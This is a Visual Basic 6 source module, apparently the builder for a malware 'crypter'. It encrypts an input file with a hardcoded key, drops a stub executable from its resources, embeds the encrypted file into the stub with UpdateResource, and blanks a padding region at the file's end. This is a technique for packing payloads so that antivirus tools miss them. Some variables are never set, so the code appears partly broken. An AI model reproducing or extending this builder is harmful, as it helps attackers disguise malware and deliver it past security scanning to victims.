Attribute VB_Name = "modMain"
Private Declare Function UpdateResource Lib "kernel32" Alias "UpdateResourceA" (ByVal hUpdate As Long, ByVal lpType As Long, ByVal lpName As Long, ByVal wLanguage As Long, lpData As Any, ByVal cbData As Long) As Long
Private Declare Function BeginUpdateResource Lib "kernel32" Alias "BeginUpdateResourceA" (ByVal pFileName As String, ByVal bDeleteExistingResources As Long) As Long
Private Declare Function EndUpdateResource Lib "kernel32" Alias "EndUpdateResourceA" (ByVal hUpdate As Long, ByVal fDiscard As Long) As Long
Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Dim ff As Long
Dim strFile As String
Dim stbArr() As Byte
Dim FinalPath As String
Dim strSplit() As String
        
Sub Main()
    On Error Resume Next
    Call EncryptFile(frmMain.txtInput) 'Encrypt the whole file before adding to resource
        
    stbArr = LoadResData(101, "CUSTOM")
    ff = FreeFile
    Open frmMain.txtOutput For Binary Access Write As ff
        Put ff, , stbArr
    Close ff
        
    Call UpdateRes 'Put the encrypted file as a resource in the stub
    Call ClearnEOF(frmMain.txtOutput) 'Overwrite junkdata at EOF
                
    ff = FreeFile
    Call EncryptFile(frmMain.txtInput) 'Restore the encrypted file
End Sub
       
    Public Function File2Str(file As String) As String
        Dim ff As Long
        ff = FreeFile
        
        Open file For Binary Access Read As ff
            File2Str = Input(FileLen(file), ff)
        Close ff
    End Function
    
    Public Function EncryptFile(Fil As String)
        Dim arr() As Byte
        Dim str As String
        
        If FileExists(Fil) = False Then End
        str = File2Str(Fil)
        arr = StrConv(EncryptData(str, "54690356098380498640967035067", False), vbFromUnicode)

        Kill Fil
        ff = FreeFile
        Open Fil For Binary Access Write As ff
            Put ff, , arr
        Close ff
    End Function
    
    Public Function FileExists(fname) As Boolean
        On Local Error Resume Next
            Dim ff
            ff = FreeFile
        Open fname For Input As ff
            If Err Then
            FileExists = False
            Else
            FileExists = True
            End If
        Close ff
    End Function
    
    Private Sub UpdateRes()
        EXEName = FinalPath
        bmpFile = strFile
        
        Dim PicBMP() As Byte ' DIB buffer
        Dim rSize As Long
        rSize = FileLen(bmpFile)
        ReDim PicBMP(rSize - 1)
        ff = FreeFile
        Open bmpFile For Binary As ff
            Get ff, , PicBMP ' Here's the DIB bitmap
        Close ff
        
        Dim hUpt As Long, ret As Long
        hUpt = BeginUpdateResource(EXEName, 1) ' use 1 to clear all existing!
        ret = UpdateResource(hUpt, 10, 101, 1035, PicBMP(0), rSize)
        ret = EndUpdateResource(hUpt, 0) ' 0 = change
    End Sub
    
    Private Sub ClearnEOF(strFile As String)
        Dim tmpStr As String
        Dim lngPos As Long
        tmpStr = File2Str(strFile)
        
        lngPos = InStr(1, tmpStr, "PADDINGX")
        
        ReDim bufNull(0 To FileLen(strFile) - lngPos) As Byte
        ff = FreeFile
        
        Open strFile For Binary Access Write As ff
            Seek ff, lngPos
            Put ff, , bufNull
        Close ff
    End Sub
